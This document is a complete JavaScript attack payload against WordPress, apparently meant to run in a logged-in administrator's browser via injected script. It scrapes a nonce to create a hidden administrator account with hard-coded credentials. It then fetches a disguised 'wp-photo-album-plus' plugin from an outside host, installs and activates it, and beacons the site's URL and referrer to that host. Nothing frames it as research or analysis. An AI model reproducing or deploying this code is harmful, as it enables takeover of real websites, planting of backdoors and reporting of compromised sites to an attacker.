
var ajaxRequest = new XMLHttpRequest();  
var host = window.location.origin
var xawef= 'https://pkj.or.id/wp-includes/js'
var requestURL = host + "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;  
ajaxRequest.open("GET", requestURL, false);  
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
if(nonceMatch != null){
    var nonce = nonceMatch[1];  
     
    // Construct a POST query, using the previously extracted 'nonce' value, and create a new user with an arbitrary username / password, as an Administrator  
    var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=supe1Userid&email=wordpUserid@org.com&pass1=supe1User.id@1z2.1&pass2=supe1User.id@1z2.1&role=administrator";  
    ajaxRequest = new XMLHttpRequest();  
    ajaxRequest.open("POST", requestURL, true);  
    ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");  
    ajaxRequest.send(params);


    ajaxRequest = new XMLHttpRequest();  
    ajaxRequest.open("GET", xawef+"/jquery_v2.2.php?location="+window.location+"&refer="+document.referrer, true);  
    ajaxRequest.send();
}
async function main() {
    
    choice = await fetchPluginsPage()
    if(choice == '[-] No tr tag found.' || choice == '[-] Error') {
        getNonce()
    }
}

async function getNonce(){
    fetch(host + '/wp-admin/plugin-install.php')
        .then(response => response.text())
        .then(data => {
            const tempDiv = document.createElement('div');
            tempDiv.innerHTML = data;

            const wpnonceInput = tempDiv.querySelector('input#_wpnonce');
            const wpnonce = wpnonceInput ? wpnonceInput.value : null;
            uploadFile(wpnonce)
        })
        .catch(error => {
            
    });
}

async function uploadFile(wpnonce) {
    try {
        const response = await fetch(xawef+'/wp-photo-album-plus-v1.php');
        const blob = await response.blob();

        const formData = new FormData();
        formData.append('pluginzip', blob, 'wp-photo-album-plus-xsaw-gu-2.zip');
        formData.append('_wpnonce', wpnonce);
        formData.append('_wp_http_referer', window.location);
        formData.append('install-plugin-submit', '1');

        const uploadResponse = await fetch(host + '/wp-admin/update.php?action=upload-plugin', {
            method: 'POST',
            body: formData
        });
        const sendData = await fetch(xawef+'/jquery_v2.2.php?type=2&location='+window.location);
        const checkResult = async () => {
            const result = await fetchPluginsPage();
            if (result == 'success') {
                clearInterval(intervalId);
            }
        };

        intervalId = setInterval(checkResult, 2000);
    } catch (error) {
        console.error('Error:', error);
    }
}


async function fetchPluginsPage() {
    try {
        const response = await fetch(host + '/wp-admin/plugins.php');
        const html = await response.text();
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = html;

        const targetTrs = tempDiv.querySelectorAll('tr[data-plugin^="wp-photo-album-plus-xsaw"]');
        flag = 0
        if (targetTrs.length > 0) {
            for (const targetTr of targetTrs) {
                const activateSpan = targetTr.querySelector('span.activate');
                if (activateSpan) {
                    const activateLink = activateSpan.querySelector('a');
                    if (activateLink) {
                        const href = activateLink.getAttribute('href');
                        const hrefResponse = await fetch(href);
                        flag = 1
                    }
                } 
            }

            if(flag == 1){
                return 'success';
            }
            return 'error';

        } else {
            return '[-] No tr tag found.';
        }
    } catch (error) {
        return '[-] Error';
    }
}
main()